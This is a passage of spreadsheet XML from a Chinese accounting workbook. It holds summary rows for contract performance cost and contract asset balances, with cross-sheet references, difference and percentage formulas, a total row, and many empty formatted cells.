      <c r="P18" s="347" t="n"/>
      <c r="Q18" s="399" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A19" s="331" t="inlineStr">
        <is>
          <t>3-9-9</t>
        </is>
      </c>
      <c r="B19" s="96" t="inlineStr">
        <is>
          <t>存货履约</t>
        </is>
      </c>
      <c r="C19" s="97" t="inlineStr">
        <is>
          <t>合同履约成本余额</t>
        </is>
      </c>
      <c r="D19" s="590">
        <f>'3-9-9合同履约成本'!E26</f>
        <v/>
      </c>
      <c r="E19" s="590">
        <f>'3-9-9合同履约成本'!F26</f>
        <v/>
      </c>
      <c r="F19" s="590">
        <f>E19-D19</f>
        <v/>
      </c>
      <c r="G19" s="590">
        <f>IF(D19=0,"",F19/D19*100)</f>
        <v/>
      </c>
      <c r="H19" s="347" t="n"/>
      <c r="I19" s="347" t="n"/>
      <c r="J19" s="347" t="n"/>
      <c r="K19" s="347" t="n"/>
      <c r="L19" s="347" t="n"/>
      <c r="M19" s="347" t="n"/>
      <c r="N19" s="347" t="n"/>
      <c r="O19" s="347" t="n"/>
      <c r="P19" s="347" t="n"/>
      <c r="Q19" s="399" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A20" s="331" t="inlineStr">
        <is>
          <t>3-10-1</t>
        </is>
      </c>
      <c r="B20" s="96" t="inlineStr">
        <is>
          <t>合同余额</t>
        </is>
      </c>
      <c r="C20" s="97" t="inlineStr">
        <is>
          <t>合同资产余额</t>
        </is>
      </c>
      <c r="D20" s="590">
        <f>'3-10合同资产'!F26</f>
        <v/>
      </c>
      <c r="E20" s="590">
        <f>'3-10合同资产'!G26</f>
        <v/>
      </c>
      <c r="F20" s="590">
        <f>E20-D20</f>
        <v/>
      </c>
      <c r="G20" s="590">
        <f>IF(D20=0,"",F20/D20*100)</f>
        <v/>
      </c>
      <c r="H20" s="347" t="n"/>
      <c r="I20" s="347" t="n"/>
      <c r="J20" s="347" t="n"/>
      <c r="K20" s="347" t="n"/>
      <c r="L20" s="347" t="n"/>
      <c r="M20" s="347" t="n"/>
      <c r="N20" s="347" t="n"/>
      <c r="O20" s="347" t="n"/>
      <c r="P20" s="347" t="n"/>
      <c r="Q20" s="399" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A21" s="284" t="n"/>
      <c r="B21" s="284" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="555" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="inlineStr"/>
      <c r="H21" s="347" t="n"/>
      <c r="I21" s="347" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="347" t="n"/>
      <c r="L21" s="347" t="n"/>
      <c r="M21" s="347" t="n"/>
      <c r="N21" s="347" t="n"/>
      <c r="O21" s="347" t="n"/>
      <c r="P21" s="347" t="n"/>
      <c r="Q21" s="399" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A22" s="284" t="n"/>
      <c r="B22" s="284" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="555" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="inlineStr"/>
      <c r="H22" s="347" t="n"/>
      <c r="I22" s="347" t="n"/>
      <c r="J22" s="347" t="n"/>
      <c r="K22" s="347" t="n"/>
      <c r="L22" s="347" t="n"/>
      <c r="M22" s="347" t="n"/>
      <c r="N22" s="347" t="n"/>
      <c r="O22" s="347" t="n"/>
      <c r="P22" s="347" t="n"/>
      <c r="Q22" s="399" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A23" s="284" t="n"/>
      <c r="B23" s="284" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="555" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="inlineStr"/>
      <c r="H23" s="347" t="n"/>
      <c r="I23" s="347" t="n"/>
      <c r="J23" s="347" t="n"/>
      <c r="K23" s="347" t="n"/>
      <c r="L23" s="347" t="n"/>
      <c r="M23" s="347" t="n"/>
      <c r="N23" s="347" t="n"/>
      <c r="O23" s="347" t="n"/>
      <c r="P23" s="347" t="n"/>
      <c r="Q23" s="399" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A24" s="284" t="n"/>
      <c r="B24" s="284" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="555" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="inlineStr"/>
      <c r="H24" s="347" t="n"/>
      <c r="I24" s="347" t="n"/>
      <c r="J24" s="347" t="n"/>
      <c r="K24" s="347" t="n"/>
      <c r="L24" s="347" t="n"/>
      <c r="M24" s="347" t="n"/>
      <c r="N24" s="347" t="n"/>
      <c r="O24" s="347" t="n"/>
      <c r="P24" s="347" t="n"/>
      <c r="Q24" s="399" t="n"/>
    </row>
    <row r="25" ht="18" customFormat="1" customHeight="1" s="389">
      <c r="A25" s="383" t="n"/>
      <c r="B25" s="185" t="inlineStr">
        <is>
          <t>流余汇总</t>
        </is>
      </c>
      <c r="C25" s="185" t="inlineStr">
        <is>
          <t>合计</t>
        </is>
      </c>
      <c r="D25" s="555">
        <f>SUM(D6:D24)</f>
        <v/>
      </c>
      <c r="E25" s="555">
        <f>SUM(E6:E24)</f>
        <v/>
      </c>
      <c r="F25" s="555">
        <f>E25-D25</f>
        <v/>
      </c>
      <c r="G25" s="555">
        <f>IF(D25=0,"",F25/D25*100)</f>
        <v/>
      </c>
      <c r="H25" s="347" t="n"/>
      <c r="I25" s="347" t="n"/>
      <c r="J25" s="347" t="n"/>
      <c r="K25" s="347" t="n"/>
      <c r="L25" s="347" t="n"/>
      <c r="M25" s="347" t="n"/>
      <c r="N25" s="347" t="n"/>
      <c r="O25" s="347" t="n"/>
      <c r="P25" s="347" t="n"/>
      <c r="Q25" s="399" t="n"/>
    </row>
    <row r="26" customFormat="1" s="389">
      <c r="A26" s="346" t="n"/>
      <c r="B26" s="346" t="n"/>
      <c r="C26" s="347" t="n"/>
      <c r="D26" s="347" t="n"/>
      <c r="E26" s="333" t="n"/>
      <c r="F26" s="550" t="n"/>
      <c r="G26" s="550" t="n"/>
      <c r="H26" s="347" t="n"/>
      <c r="I26" s="347" t="n"/>
      <c r="J26" s="347" t="n"/>
      <c r="K26" s="347" t="n"/>
      <c r="L26" s="347" t="n"/>
      <c r="M26" s="347" t="n"/>
      <c r="N26" s="347" t="n"/>
      <c r="O26" s="347" t="n"/>
      <c r="P26" s="347" t="n"/>
      <c r="Q26" s="399" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="344" t="n"/>
      <c r="B27" s="344" t="n"/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322" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="344" t="n"/>
      <c r="B28" s="344" t="n"/>
      <c r="C28" s="347" t="n"/>
      <c r="D28" s="347" t="n"/>
      <c r="E28" s="347" t="n"/>
      <c r="F28" s="347" t="n"/>
      <c r="G28" s="347" t="n"/>
      <c r="H28" s="347" t="n"/>
      <c r="I28" s="347" t="n"/>
      <c r="J28" s="347" t="n"/>
      <c r="K28" s="347" t="n"/>
      <c r="L28" s="347" t="n"/>
      <c r="M28" s="347" t="n"/>
      <c r="N28" s="347" t="n"/>
      <c r="O28" s="347" t="n"/>
      <c r="P28" s="347" t="n"/>
      <c r="Q28" s="322" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="344" t="n"/>
      <c r="B29" s="344" t="n"/>
      <c r="C29" s="347" t="n"/>
      <c r="D29" s="347" t="n"/>
      <c r="E29" s="347" t="n"/>
      <c r="F29" s="347" t="n"/>
      <c r="G29" s="347" t="n"/>
      <c r="H29" s="347" t="n"/>
      <c r="I29" s="347" t="n"/>
      <c r="J29" s="347" t="n"/>
      <c r="K29" s="347" t="n"/>
      <c r="L29" s="347" t="n"/>
      <c r="M29" s="347" t="n"/>
      <c r="N29" s="347" t="n"/>
      <c r="O29" s="347" t="n"/>
      <c r="P29" s="347" t="n"/>
      <c r="Q29" s="322" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="344" t="n"/>
      <c r="B30" s="344" t="n"/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322" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="347" t="n"/>
      <c r="B31" s="347" t="n"/>
      <c r="C31" s="347" t="n"/>
      <c r="D31" s="347" t="n"/>
      <c r="E31" s="347" t="n"/>
      <c r="F31" s="347" t="n"/>
      <c r="G31" s="347" t="n"/>
      <c r="H31" s="347" t="n"/>
      <c r="I31" s="347" t="n"/>
      <c r="J31" s="347" t="n"/>
      <c r="K31" s="347" t="n"/>
      <c r="L31" s="347" t="n"/>
      <c r="M31" s="347" t="n"/>
      <c r="N31" s="347" t="n"/>
      <c r="O31" s="347" t="n"/>
      <c r="P31" s="347" t="n"/>
      <c r="Q31" s="322" t="n"/>
    </row>
    <row r="32" s="415">
      <c r="A32" s="347" t="n"/>
      <c r="B32" s="347" t="n"/>
      <c r="C32" s="347" t="n"/>
      <c r="D32" s="347" t="n"/>
      <c r="E32" s="347" t="n"/>
      <c r="F32" s="347" t="n"/>
      <c r="G32" s="347" t="n"/>
      <c r="H32" s="347" t="n"/>
      <c r="I32" s="347" t="n"/>
      <c r="J32" s="347" t="n"/>
      <c r="K32" s="347" t="n"/>
      <c r="L32" s="347" t="n"/>
      <c r="M32" s="347" t="n"/>
      <c r="N32" s="347" t="n"/>
      <c r="O32" s="347" t="n"/>
      <c r="P32" s="347" t="n"/>
      <c r="Q32" s="322" t="n"/>
    </row>
    <row r="33" s="415">
      <c r="A33" s="347" t="n"/>
      <c r="B33" s="347" t="n"/>
      <c r="C33" s="347" t="n"/>
      <c r="D33" s="347" t="n"/>
      <c r="E33" s="347" t="n"/>
      <c r="F33" s="347" t="n"/>
      <c r="G33" s="347" t="n"/>
      <c r="H33" s="347" t="n"/>
      <c r="I33" s="347" t="n"/>
      <c r="J33" s="347" t="n"/>
      <c r="K33" s="347" t="n"/>
      <c r="L33" s="347" t="n"/>
      <c r="M33" s="347" t="n"/>
      <c r="N33" s="347" t="n"/>
      <c r="O33" s="347" t="n"/>
      <c r="P33" s="347" t="n"/>
      <c r="Q33" s="322" t="n"/>
    </row>
    <row r="34" s="415">
      <c r="A34" s="347" t="n"/>
      <c r="B34" s="347" t="n"/>
      <c r="C34" s="347" t="n"/>
      <c r="D34" s="347" t="n"/>
      <c r="E34" s="347" t="n"/>
      <c r="F34" s="347" t="n"/>
      <c r="G34" s="347" t="n"/>
      <c r="H34" s="347" t="n"/>
      <c r="I34" s="347" t="n"/>
      <c r="J34" s="347" t="n"/>
      <c r="K34" s="347" t="n"/>
      <c r="L34" s="347" t="n"/>
      <c r="M34" s="347" t="n"/>
      <c r="N34" s="347" t="n"/>
      <c r="O34" s="347" t="n"/>
      <c r="P34" s="347" t="n"/>
      <c r="Q34" s="322" t="n"/>
    </row>
    <row r="35" s="415">
      <c r="A35" s="347" t="n"/>
      <c r="B35" s="347" t="n"/>
      <c r="C35" s="347" t="n"/>
      <c r="D35" s="347" t="n"/>
      <c r="E35" s="347" t="n"/>
      <c r="F35" s="347" t="n"/>
      <c r="G35" s="347" t="n"/>
      <c r="H35" s="347" t="n"/>
      <c r="I35" s="347" t="n"/>
      <c r="J35" s="347" t="n"/>
      <c r="K35" s="347" t="n"/>
      <c r="L35" s="347" t="n"/>
      <c r="M35" s="347" t="n"/>
      <c r="N35" s="347" t="n"/>
      <c r="O35" s="347" t="n"/>
      <c r="P35" s="347" t="n"/>
      <c r="Q35" s="322" t="n"/>
    </row>
    <row r="36" s="415">
      <c r="A36" s="347" t="n"/>
      <c r="B36" s="347" t="n"/>
      <c r="C36" s="347" t="n"/>
      <c r="D36" s="347" t="n"/>
      <c r="E36" s="347" t="n"/>
      <c r="F36" s="347" t="n"/>
      <c r="G36" s="347" t="n"/>
      <c r="H36" s="347" t="n"/>
      <c r="I36" s="347" t="n"/>
      <c r="J36" s="347" t="n"/>
      <c r="K36" s="347" t="n"/>
      <c r="L36" s="347" t="n"/>
      <c r="M36" s="347" t="n"/>
      <c r="N36" s="347" t="n"/>
      <c r="O36" s="347" t="n"/>
      <c r="P36" s="347" t="n"/>
      <c r="Q36" s="322" t="n"/>
    </row>
    <row r="37" s="415">
      <c r="A37" s="347" t="n"/>
      <c r="B37" s="347" t="n"/>
      <c r="C37" s="347" t="n"/>
      <c r="D37" s="347" t="n"/>
      <c r="E37" s="347" t="n"/>
      <c r="F37" s="347" t="n"/>
      <c r="G37" s="347" t="n"/>
      <c r="H37" s="347" t="n"/>
      <c r="I37" s="347" t="n"/>
      <c r="J37" s="347" t="n"/>
      <c r="K37" s="347" t="n"/>
      <c r="L37" s="347" t="n"/>
      <c r="M37" s="347" t="n"/>
      <c r="N37" s="347" t="n"/>
      <c r="O37" s="347" t="n"/>
      <c r="P37" s="347" t="n"/>
      <c r="Q37" s="322" t="n"/>
    </row>
    <row r="38" s="415">
      <c r="A38" s="347" t="n"/>
      <c r="B38" s="347" t="n"/>
      <c r="C38" s="347" t="n"/>
      <c r="D38" s="347" t="n"/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/>
      <c r="N38" s="347" t="n"/>
      <c r="O38" s="347" t="n"/>
      <c r="P38" s="347" t="n"/>
      <c r="Q38" s="322" t="n"/>
    </row>
    <row r="39" s="415">
      <c r="A39" s="347" t="n"/>
      <c r="B39" s="347" t="n"/>
      <c r="C39" s="347" t="n"/>
      <c r="D39" s="347" t="n"/>
      <c r="E39" s="347" t="n"/>
      <c r="F39" s="347" t="n"/>
      <c r="G39" s="347" t="n"/>
      <c r="H39" s="347" t="n"/>
      <c r="I39" s="347" t="n"/>
      <c r="J39" s="347" t="n"/>
      <c r="K39" s="347" t="n"/>
      <c r="L39" s="347" t="n"/>
      <c r="M39" s="347" t="n"/>
      <c r="N39" s="347" t="n"/>
      <c r="O39" s="347" t="n"/>
      <c r="P39" s="347" t="n"/>
      <c r="Q39" s="322" t="n"/>
    </row>
    <row r="40" s="415">
      <c r="A40" s="347" t="n"/>
      <c r="B40" s="347" t="n"/>
      <c r="C40" s="347" t="n"/>
      <c r="D40" s="347" t="n"/>
      <c r="E40" s="347" t="n"/>
      <c r="F40" s="347" t="n"/>
      <c r="G40" s="347" t="n"/>
      <c r="H40" s="347" t="n"/>
      <c r="I40" s="347" t="n"/>
      <c r="J40" s="347" t="n"/>
      <c r="K40" s="347" t="n"/>
      <c r="L40" s="347" t="n"/>
      <c r="M40" s="347" t="n"/>
      <c r="N40" s="347" t="n"/>
      <c r="O40" s="347" t="n"/>
      <c r="P40" s="347" t="n"/>
      <c r="Q40" s="322" t="n"/>
    </row>
    <row r="41" s="415">
      <c r="A41" s="347" t="n"/>
      <c r="B41" s="347" t="n"/>
      <c r="C41" s="347" t="n"/>
      <c r="D41" s="347" t="n"/>
      <c r="E41" s="347" t="n"/>
      <c r="F41" s="347" t="n"/>
      <c r="G41" s="347" t="n"/>
      <c r="H41" s="347" t="n"/>
      <c r="I41" s="347" t="n"/>
      <c r="J41" s="347" t="n"/>
      <c r="K41" s="347" t="n"/>
      <c r="L41" s="347" t="n"/>
      <c r="M41" s="347" t="n"/>
      <c r="N41" s="347" t="n"/>
      <c r="O41" s="347" t="n"/>
      <c r="P41" s="347" t="n"/>
      <c r="Q41" s="322" t="n"/>
    </row>
    <row r="42" s="415">
      <c r="A42" s="347" t="n"/>
      <c r="B42" s="347" t="n"/>
      <c r="C42" s="347" t="n"/>
      <c r="D42" s="347" t="n"/>
      <c r="E42" s="347" t="n"/>
      <c r="F42" s="347" t="n"/>
      <c r="G42" s="347" t="n"/>
      <c r="H42" s="347" t="n"/>
      <c r="I42" s="347" t="n"/>
      <c r="J42" s="347" t="n"/>
      <c r="K42" s="347" t="n"/>
      <c r="L42" s="347" t="n"/>
      <c r="M42" s="347" t="n"/>
      <c r="N42" s="347" t="n"/>
      <c r="O42" s="347" t="n"/>
      <c r="P42" s="347" t="n"/>
      <c r="Q42" s="322" t="n"/>
    </row>
    <row r="43" s="415">
      <c r="A43" s="347" t="n"/>
      <c r="B43" s="347" t="n"/>
      <c r="C43" s="347" t="n"/>
      <c r="D43" s="347" t="n"/>
      <c r="E43" s="347" t="n"/>
      <c r="F43" s="347" t="n"/>
      <c r="G43" s="347" t="n"/>
      <c r="H43" s="347" t="n"/>
      <c r="I43" s="347" t="n"/>
      <c r="J43" s="347" t="n"/>
      <c r="K43" s="347" t="n"/>
      <c r="L43" s="347" t="n"/>
      <c r="M43" s="347" t="n"/>
      <c r="N43" s="347" t="n"/>
      <c r="O43" s="347" t="n"/>
      <c r="P43" s="347" t="n"/>
      <c r="Q43" s="322" t="n"/>
    </row>
    <row r="44" s="415">
      <c r="A44" s="347" t="n"/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7" t="n"/>
      <c r="L44" s="347" t="n"/>
      <c r="M44" s="347" t="n"/>
      <c r="N44" s="347" t="n"/>
      <c r="O44" s="347" t="n"/>
      <c r="P44" s="347" t="n"/>
      <c r="Q44" s="322" t="n"/>
    </row>
    <row r="45" s="415">
      <c r="A45" s="347" t="n"/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7" t="n"/>
      <c r="L45" s="347" t="n"/>
      <c r="M45" s="347" t="n"/>
      <c r="N45" s="347" t="n"/>
      <c r="O45" s="347" t="n"/>
      <c r="P45" s="347" t="n"/>
      <c r="Q45" s="322" t="n"/>
    </row>
    <row r="46" s="415">
      <c r="A46" s="347" t="n"/>
      <c r="B46" s="347" t="n"/>
      <c r="C46" s="347" t="n"/>
      <c r="D46" s="347" t="n"/>
      <c r="E46" s="347" t="n"/>
      <c r="F46" s="347" t="n"/>
      <c r="G46" s="347" t="n"/>
      <c r="H46" s="347" t="n"/>
      <c r="I46" s="347" t="n"/>
      <c r="J46" s="347" t="n"/>
      <c r="K46" s="347" t="n"/>
      <c r="L46" s="347" t="n"/>
      <c r="M46" s="347" t="n"/>
      <c r="N46" s="347" t="n"/>
      <c r="O46" s="347" t="n"/>
      <c r="P46" s="347" t="n"/>
      <c r="Q46" s="322" t="n"/>
    </row>
    <row r="47" s="415">
      <c r="A47" s="347" t="n"/>
      <c r="B47" s="347" t="n"/>
      <c r="C47" s="347" t="n"/>
      <c r="D47" s="347" t="n"/>
      <c r="E47" s="347" t="n"/>
      <c r="F47" s="347" t="n"/>
      <c r="G47" s="347" t="n"/>
      <c r="H47" s="347" t="n"/>
      <c r="I47" s="347" t="n"/>
      <c r="J47" s="347" t="n"/>
      <c r="K47" s="347" t="n"/>
      <c r="L47" s="347" t="n"/>
      <c r="M47" s="347" t="n"/>
      <c r="N47" s="347" t="n"/>
      <c r="O47" s="347" t="n"/>
      <c r="P47" s="347" t="n"/>
      <c r="Q47" s="322" t="n"/>
    </row>
    <row r="48" s="415">
      <c r="A48" s="347" t="n"/>
      <c r="B48" s="347" t="n"/>
      <c r="C48" s="347" t="n"/>
      <c r="D48" s="347" t="n"/>
      <c r="E48" s="347" t="n"/>
      <c r="F48" s="347" t="n"/>
      <c r="G48" s="347" t="n"/>
      <c r="H48" s="347" t="n"/>
      <c r="I48" s="347" t="n"/>
      <c r="J48" s="347" t="n"/>
      <c r="K48" s="347" t="n"/>
      <c r="L48" s="347" t="n"/>
      <c r="M48" s="347" t="n"/>
      <c r="N48" s="347" t="n"/>
      <c r="O48" s="347" t="n"/>
      <c r="P48" s="347" t="n"/>
      <c r="Q48" s="322" t="n"/>
    </row>
    <row r="49" s="415">
      <c r="A49" s="347" t="n"/>
      <c r="B49" s="347" t="n"/>
      <c r="C49" s="347" t="n"/>
      <c r="D49" s="347" t="n"/>
      <c r="E49" s="347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47" t="n"/>
      <c r="O49" s="347" t="n"/>
      <c r="P49" s="347" t="n"/>
      <c r="Q49" s="322" t="n"/>
    </row>
    <row r="50" s="415">
      <c r="A50" s="347" t="n"/>
      <c r="B50" s="347" t="n"/>
      <c r="C50" s="347" t="n"/>
      <c r="D50" s="347" t="n"/>
      <c r="E50" s="347" t="n"/>
      <c r="F50" s="347" t="n"/>
      <c r="G50" s="347" t="n"/>
      <c r="H50" s="347" t="n"/>
      <c r="I50" s="347" t="n"/>
      <c r="J50" s="347" t="n"/>
      <c r="K50" s="347" t="n"/>
      <c r="L50" s="347" t="n"/>
      <c r="M50" s="347" t="n"/>
      <c r="N50" s="347" t="n"/>
      <c r="O50" s="347" t="n"/>
      <c r="P50" s="347" t="n"/>
      <c r="Q50" s="322" t="n"/>
    </row>
    <row r="51" s="415">
      <c r="A51" s="347" t="n"/>
      <c r="B51" s="347" t="n"/>
      <c r="C51" s="347" t="n"/>
      <c r="D51" s="347" t="n"/>
      <c r="E51" s="347" t="n"/>
      <c r="F51" s="347" t="n"/>
      <c r="G51" s="347" t="n"/>
      <c r="H51" s="347" t="n"/>
      <c r="I51" s="347" t="n"/>
      <c r="J51" s="347" t="n"/>
      <c r="K51" s="347" t="n"/>
      <c r="L51" s="347" t="n"/>
      <c r="M51" s="347" t="n"/>
      <c r="N51" s="347" t="n"/>
      <c r="O51" s="347" t="n"/>
      <c r="P51" s="347" t="n"/>
      <c r="Q51" s="322" t="n"/>
    </row>
    <row r="52" s="415">
      <c r="A52" s="347" t="n"/>
      <c r="B52" s="347" t="n"/>
      <c r="C52" s="347" t="n"/>
      <c r="D52" s="347" t="n"/>
      <c r="E52" s="347" t="n"/>
      <c r="F52" s="347" t="n"/>
      <c r="G52" s="347" t="n"/>
      <c r="H52" s="347" t="n"/>
      <c r="I52" s="347" t="n"/>
      <c r="J52" s="347" t="n"/>
      <c r="K52" s="347" t="n"/>
      <c r="L52" s="347" t="n"/>
      <c r="M52" s="347" t="n"/>
      <c r="N52" s="347" t="n"/>
      <c r="O52" s="347" t="n"/>
      <c r="P52" s="347" t="n"/>
      <c r="Q52" s="322" t="n"/>
    </row>
    <row r="53" s="415">
      <c r="A53" s="347" t="n"/>
      <c r="B53" s="347" t="n"/>
      <c r="C53" s="347" t="n"/>
      <c r="D53" s="347" t="n"/>
      <c r="E53" s="347" t="n"/>
      <c r="F53" s="347" t="n"/>
      <c r="G53" s="347" t="n"/>
      <c r="H53" s="347" t="n"/>
      <c r="I53" s="347" t="n"/>
      <c r="J53" s="347" t="n"/>
      <c r="K53" s="347" t="n"/>
      <c r="L53" s="347" t="n"/>
      <c r="M53" s="347" t="n"/>
      <c r="N53" s="347" t="n"/>
      <c r="O53" s="347" t="n"/>
      <c r="P53" s="347" t="n"/>
      <c r="Q53" s="322" t="n"/>
    </row>
    <row r="54" s="415">
      <c r="A54" s="347" t="n"/>
      <c r="B54" s="347" t="n"/>
      <c r="C54" s="347" t="n"/>
      <c r="D54" s="347" t="n"/>
      <c r="E54" s="347" t="n"/>
      <c r="F54" s="347" t="n"/>
      <c r="G54" s="347" t="n"/>
      <c r="H54" s="347" t="n"/>
      <c r="I54" s="347" t="n"/>
      <c r="J54" s="347" t="n"/>
      <c r="K54" s="347" t="n"/>
      <c r="L54" s="347" t="n"/>
      <c r="M54" s="347" t="n"/>
      <c r="N54" s="347" t="n"/>
      <c r="O54" s="347" t="n"/>
      <c r="P54" s="347" t="n"/>
      <c r="Q54" s="322" t="n"/>
    </row>
    <row r="55" s="415">
      <c r="A55" s="347" t="n"/>
      <c r="B55" s="347" t="n"/>
      <c r="C55" s="347" t="n"/>
      <c r="D55" s="347" t="n"/>
      <c r="E55" s="347" t="n"/>
      <c r="F55" s="347" t="n"/>
      <c r="G55" s="347" t="n"/>
      <c r="H55" s="347" t="n"/>
      <c r="I55" s="347" t="n"/>
      <c r="J55" s="347" t="n"/>
      <c r="K55" s="347" t="n"/>
      <c r="L55" s="347" t="n"/>
      <c r="M55" s="347" t="n"/>
      <c r="N55" s="347" t="n"/>
      <c r="O55" s="347" t="n"/>
      <c r="P55" s="347" t="n"/>
      <c r="Q55" s="322" t="n"/>
    </row>
    <row r="56" s="415">
      <c r="A56" s="347" t="n"/>
      <c r="B56" s="347" t="n"/>
      <c r="C56" s="347" t="n"/>
      <c r="D56" s="347" t="n"/>
      <c r="E56" s="347" t="n"/>
      <c r="F56" s="347" t="n"/>
      <c r="G56" s="347" t="n"/>
      <c r="H56" s="347" t="n"/>
      <c r="I56" s="347" t="n"/>
      <c r="J56" s="347" t="n"/>
      <c r="K56" s="347" t="n"/>
      <c r="L56" s="347" t="n"/>
      <c r="M56" s="347" t="n"/>
      <c r="N56" s="347" t="n"/>
      <c r="O56" s="347" t="n"/>
      <c r="P56" s="347" t="n"/>
      <c r="Q56" s="322" t="n"/>
    </row>
    <row r="57" s="415">
      <c r="A57" s="347" t="n"/>
      <c r="B57" s="347" t="n"/>
      <c r="C57" s="347" t="n"/>
      <c r="D57" s="347" t="n"/>
      <c r="E57" s="347" t="n"/>
      <c r="F57" s="347" t="n"/>
      <c r="G57" s="347" t="n"/>
      <c r="H57" s="347" t="n"/>
      <c r="I57" s="347" t="n"/>
      <c r="J57" s="347" t="n"/>
      <c r="K57" s="347" t="n"/>
      <c r="L57" s="347" t="n"/>
      <c r="M57" s="347" t="n"/>
      <c r="N57" s="347" t="n"/>
      <c r="O57" s="347" t="n"/>
      <c r="P57" s="347" t="n"/>
      <c r="Q57" s="322" t="n"/>
    </row>
    <row r="58" s="415">
      <c r="A58" s="347" t="n"/>
      <c r="B58" s="347" t="n"/>
      <c r="C58" s="347" t="n"/>
      <c r="D58" s="347" t="n"/>
      <c r="E58" s="347" t="n"/>
      <c r="F58" s="347" t="n"/>
      <c r="G58" s="347" t="n"/>
      <c r="H58" s="347" t="n"/>
      <c r="I58" s="347" t="n"/>
      <c r="J58" s="347" t="n"/>
      <c r="K58" s="347" t="n"/>
      <c r="L58" s="347" t="n"/>
      <c r="M58" s="347" t="n"/>
      <c r="N58" s="347" t="n"/>
      <c r="O58" s="347" t="n"/>
      <c r="P58" s="347" t="n"/>
      <c r="Q58" s="322" t="n"/>
    </row>
    <row r="59" s="415">
      <c r="A59" s="347" t="n"/>
      <c r="B59" s="347" t="n"/>
      <c r="C59" s="347" t="n"/>
      <c r="D59" s="347" t="n"/>
      <c r="E59" s="347" t="n"/>
      <c r="F59" s="347" t="n"/>
      <c r="G59" s="347" t="n"/>
      <c r="H59" s="347" t="n"/>
      <c r="I59" s="347" t="n"/>
      <c r="J59" s="347" t="n"/>
      <c r="K59" s="347" t="n"/>
      <c r="L59" s="347" t="n"/>
      <c r="M59" s="347" t="n"/>
      <c r="N59" s="347" t="n"/>
      <c r="O59" s="347" t="n"/>
      <c r="P59" s="347" t="n"/>
      <c r="Q59" s="322" t="n"/>
    </row>
    <row r="60" s="415">
      <c r="A60" s="347" t="n"/>
      <c r="B60" s="347" t="n"/>
      <c r="C60" s="347" t="n"/>
      <c r="D60" s="347" t="n"/>
      <c r="E60" s="347" t="n"/>
      <c r="F60" s="347" t="n"/>
      <c r="G60" s="347" t="n"/>
      <c r="H60" s="347" t="n"/>
      <c r="I60" s="347" t="n"/>
      <c r="J60" s="347" t="n"/>
      <c r="K60" s="347" t="n"/>
      <c r="L60" s="347" t="n"/>
      <c r="M60" s="347" t="n"/>
      <c r="N60" s="347" t="n"/>
      <c r="O60" s="347" t="n"/>
      <c r="P60" s="347" t="n"/>
      <c r="Q60" s="322" t="n"/>
    </row>
    <row r="61" s="415">
      <c r="A61" s="347" t="n"/>
      <c r="B61" s="347" t="n"/>
      <c r="C61" s="347" t="n"/>
      <c r="D61" s="347" t="n"/>
      <c r="E61" s="347" t="n"/>
      <c r="F61" s="347" t="n"/>
      <c r="G61" s="347" t="n"/>
      <c r="H61" s="347" t="n"/>
      <c r="I61" s="347" t="n"/>
      <c r="J61" s="347" t="n"/>
      <c r="K61" s="347" t="n"/>
      <c r="L61" s="347" t="n"/>
      <c r="M61" s="347" t="n"/>
      <c r="N61" s="347" t="n"/>
      <c r="O61" s="347" t="n"/>
      <c r="P61" s="347" t="n"/>
      <c r="Q61" s="322" t="n"/>
    </row>
    <row r="62" s="415">
      <c r="A62" s="347" t="n"/>
      <c r="B62" s="347" t="n"/>
      <c r="C62" s="347" t="n"/>
      <c r="D62" s="347" t="n"/>
      <c r="E62" s="347" t="n"/>
      <c r="F62" s="347" t="n"/>
      <c r="G62" s="347" t="n"/>
      <c r="H62" s="347" t="n"/>
      <c r="I62" s="347" t="n"/>
      <c r="J62" s="347" t="n"/>
      <c r="K62" s="347" t="n"/>
      <c r="L62" s="347" t="n"/>
      <c r="M62" s="347" t="n"/>
      <c r="N62" s="347" t="n"/>
      <c r="O62" s="347" t="n"/>
      <c r="P62" s="347" t="n"/>
      <c r="Q62" s="322" t="n"/>
    </row>
    <row r="63" s="415">
      <c r="A63" s="347" t="n"/>
      <c r="B63" s="347" t="n"/>
      <c r="C63" s="347" t="n"/>
      <c r="D63" s="347" t="n"/>
      <c r="E63" s="347" t="n"/>
      <c r="F63" s="347" t="n"/>
      <c r="G63" s="347" t="n"/>
      <c r="H63" s="347" t="n"/>
      <c r="I63" s="347" t="n"/>
      <c r="J63" s="347" t="n"/>
      <c r="K63" s="347" t="n"/>
      <c r="L63" s="347" t="n"/>
      <c r="M63" s="347" t="n"/>
      <c r="N63" s="347" t="n"/>
      <c r="O63" s="347" t="n"/>
      <c r="P63" s="347" t="n"/>
      <c r="Q63" s="322" t="n"/>
    </row>
    <row r="64" s="415">
      <c r="A64" s="347" t="n"/>
      <c r="B64" s="347" t="n"/>
      <c r="C64" s="347" t="n"/>
      <c r="D64" s="347" t="n"/>
      <c r="E64" s="347" t="n"/>
      <c r="F64" s="347" t="n"/>
      <c r="G64" s="347" t="n"/>
